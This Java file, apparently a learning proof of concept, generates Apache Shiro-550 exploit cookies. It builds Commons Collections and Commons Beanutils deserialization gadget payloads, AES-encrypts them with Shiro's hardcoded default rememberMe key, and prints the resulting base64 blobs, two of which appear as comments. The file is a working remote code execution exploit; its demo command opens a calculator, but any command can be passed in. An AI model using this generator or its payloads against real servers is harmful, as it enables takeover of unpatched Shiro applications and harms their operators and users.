import com.xjjlearning.hack.java.ysoserial.payloads.CommonsBeanutil;
import com.xjjlearning.hack.java.ysoserial.payloads.CommonsCollectionsShiro;
import org.apache.shiro.crypto.AesCipherService;

import java.util.Base64;

/**
 * created by xjj on 2023/2/4
 */
public class AttackShiro550 {
    public static void main(String[] args) throws Exception {
        // CookieRememberMeManager
        byte[] payload = new CommonsCollectionsShiro().getPayload("open -a Calculator");
        System.out.println(getShiroPayload(payload));
        // sWt/oBf/35glm0D6R+Rep/tpgbxx6VodjdwosJDmjBW7qd7eiZHro5kFH17Z/F+fJEsTM874alJCppcqyxRtG1APf4OsXKVuJW12r9EBwYlOR0NqO6HdeZ01g6oH0ffv49qQ/ye/6c4JZeEjUQYJ2wRPx5+DP4RkLt6qkhX1vPlXaxeh+O8Dxm43MS25KQbkd4wFk6OLbrbNpOHtJdUXTlQsKf1C2UNVLadSZ6YNs6XUN3M36LTUd+6oCusBn7FUDZYizApW+KHOno0+YF+/lXsMWfEU3h3MJZKpibegr8hdDI0pI82bFohbUqgST02oMq2l5col2knwAlLw1EeEwFNtGFbsruGNr2RLYqWlAuZxx6ldZIFSHU4hBxg2HlyltBrQYeAQHwDu5BpIprnT1fXmNkWD9yEmi5DJ2LBswGZMrrRwuJc2BhFJr7x1tO0Dwfp/uvojELeIi1lmIY6f4xL3d1Y3q41hZ5XLjOr+eENdO/8mGOJs+T3ouUgwRAcoFPAK8TsgRxCmV3+DRyhoMMegeD4o4W158thu7MM18HLw046xWFO8NZ2O5o5E5Aft0f9YhuLh5NkSeQ8mNRHxFqOC1phlCxKZbq/NlEuPy+JVv+JqyWmaTI11TapWzGtYRUroSBI85/PQaHOrQJErRpGM5OLbp/CI9IU+SI3upHoUOetRLnfk5yiLPlyvCYPg3Xg81kvUmhGNC+h+3oRPYdAv9L5SibJieiywdNEvoPOjzb6u+FGigyN0eiTy4kGQitPXVErac37R72rk43HzEJ5eirMPgHZeYOHUnSP6qqL/+OjMlUCsLUkx1QgG/RFCI/B3oqgs3RKmV1CkjDUssjHCtTjlco3/Dwd9BiHMQJKN0vyyhAn2gavI7hKIjUMAvPfMPCq4I1ezRNX/Sr4YqlYfRXBhYA5kvhFCDJVpgP7cgjq5/xfO6gUl830xFSD0pexLmtKCGQ70gEX6GV9Phs3ZkJxnWobeU+O00w8I0BlM4fipTVzvBU3PJ1V5JaIuEFGgk7yJzDyT+Mm6IGbOPbT44Gv6P4Itt17vXUzJMUMx4F8nEQhToMblzXJqabUw5DTP/ujaFYzu82fpA6+D+Nn0OJiq2efdmwPzDWQIhNBMJXtWne4mB736dq8M0mYzOTBxVh/b5UjGueP+Bq5BHGqW/9PaTbXhPeVZBDbrnHlCTUEGvaQYRHLNp38jtpi1jsww63hsA3wrLSKWdjO96JlgQgfN+rW/4mVAX4aftKA2c/Hisb3cevwyI4IZc1sXHwofel7Ze+IC9i9tEcq61Hy0+GbZn174rrhyUgyyBK+4xyXdfYHKvxbH4LtmhlG704/4ngPoUUFg+9QiykkAxFaiywla8zdV/na6xs1o2/cgmgG075+EyNI6czy0edXxn5UaoKZsMD4e/5i9pLTKKV1SEDdgQdrbVue+XX/2YvSD1NcWQ5DLXePg2xtacryQoH4x1EnFOHPiL0gT/ftWoNg4JZETe2WMcIuA2akeGanPujl1BJk5ql7hOB/qj14Yzd1YZVfdjVMHr/wKYBXoUX2LGugAzJtgR4xwPTSWM24jCq1lFIAz941kMfk/O5nZYSZD11Xj5mYUCRh+Lu4zGGmdDbGaHfRtu8xF6AKiP7G2TrzlLLTYKeORokpk9y5JXbfMS5dg48OVhlz1duF4IlqXtF7sThjL4RiRVAWYrMxUksHt0Se1dw1CvvY5WZKM24N6JvCrIluGCC1M96h35mqkxuMMrE407zdYRffDfPsyIurZ/lJo6HiyUVe1QiQ8aDAyKtPytDIE38PQ0EowKVZBRsksWrEVlOOW1kMVrJy1hOOlYAeVib9BJJ8eKpFxRZzpsHawusCGZug9vwmb73Kb1q/3lnm/TeuywsXJL7C5DuTG5clop8MdlR7p21542KlF19xphZ8tFOtsb4Z8X2+rYxffFTFEA+l0Ch59eJhOVE3n5VlxPY3m48cWqDE49q9wScvyXyR6R61OncdSSdlASvh/3H5c5lxmP3+V1+0dEJWC69UbOUUOl9T7juLfbY7edcWuKBAPeeqbCB5pcwM1YPv6ZhCvK71sa6FUJpSPTb39yXGnmltPq3tq03xqruz3c1OIqqOUeGPcBVDso0nO/Ag1GnN2arkkqY70VljdkBLUwjthIB+ue/kISySyT0uhBayG/jBAX7hF1y61Qh3BKCO2MmGSphbbxwQ5Nw2/itQPtUHz7WqAzRE3ps5CGfaVbJRuZ7yhA71zE2HJqQ4ENqDFX8rIsWwD/bjj0t9rVUfRx8RVGI2qX6eGMol7YQFDXv1Q57bBwCE2sNj5T8QvhKRa22EVA1mRNfqL9Gcip7T/AWg4Ciwuq96qmsgsoj9UbFTo2QGX90knQGH6W5foIkzobC/Y9pbI7eDcK+vGH/q2HZLccfg1jIk4ltj58IEM76NK80l4P8YiGah6O7oItepA9ym/m0wE93fib0D7Hfj57k69W9mgWAoTVlQLwINLod24UD1YMY9iEeBiVBVwh5HtdevVvgXGCloa7sMEHEveDlD0tPF/Dv/nn1nsF6sVw4c3BMRIIYPuIOH5xHmanYiflN964+4GKFOH1kloJdsX7bef05dpm9D04LXT0jel2iPjO0Xx1hLl56w0cdIOfHJUB+oIR4A/FVnmC9sCl3BltlwuQhAXO21vc3PqzQff3ZKm5jruwEi6pSlbEydjbHrTF1zdwkMUXZr2kGpxkaSkeyLc332xzG7GqCDDmIHh1hw2l9YqH6xuc7oYUNVrSu/Sh+As4LD2yd2dAoV7G0jz61Pmr22NYGDmVil4K2RbitzgEBZKB5K7OgQn5ISHqpnn+Zg4G8tJnJV8A7MjwJ02E+an+G+d+vVpbLys539GrCx0fXtEjsCLC6Qho+2a+Se9U1XGehC8N/R9+9U+Il8uLGI4YpLHlp+iCEAlmaP7JoHJkk/gmS8zo9gv8g==

        byte[] payload2 = new CommonsBeanutil().getPayload("");
        System.out.println(getShiroPayload(payload2));
        // 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
    }

    private static String getShiroPayload(byte[] payload) {
        AesCipherService aes = new AesCipherService();
        // org.apache.shiro.web.mgt.CookieRememberMeManager.java为入口点分析
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        return aes.encrypt(payload, key).toString();
    }
}
